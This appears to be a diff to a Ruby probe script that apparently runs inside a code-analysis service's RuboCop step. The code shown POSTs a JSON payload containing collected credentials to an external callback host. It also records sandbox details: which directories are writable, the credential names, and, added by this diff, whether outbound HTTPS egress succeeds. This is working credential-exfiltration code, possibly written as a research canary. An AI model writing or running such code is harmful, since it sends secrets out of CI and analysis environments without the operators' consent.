@@ -38,21 +38,22 @@ payload = JSON.generate(
   credentials: credentials
 )
 
-begin
+https_egress = begin
   request = Net::HTTP::Post.new(CALLBACK)
   request["content-type"] = "application/json"
   request["user-agent"] = "codacy-analyzer-canary/rubocop"
   request.body = payload
 
-  Net::HTTP.start(
+  response = Net::HTTP.start(
     CALLBACK.host,
     CALLBACK.port,
     use_ssl: true,
     open_timeout: 5,
     read_timeout: 5
   ) { |http| http.request(request) }
+  response.is_a?(Net::HTTPSuccess)
 rescue StandardError
-  nil
+  false
 end
 
 CODACY_RUNTIME_EVIDENCE = [
@@ -62,6 +63,7 @@ CODACY_RUNTIME_EVIDENCE = [
   "source_writable=#{writable?('/src')}",
   "root_writable=#{writable?('/')}",
   "workdir_writable=#{writable?('/workdir')}",
+  "https_egress=#{https_egress}",
   "credential_names=#{credentials.keys.sort.join(',')}"
 ].join(" ")
 
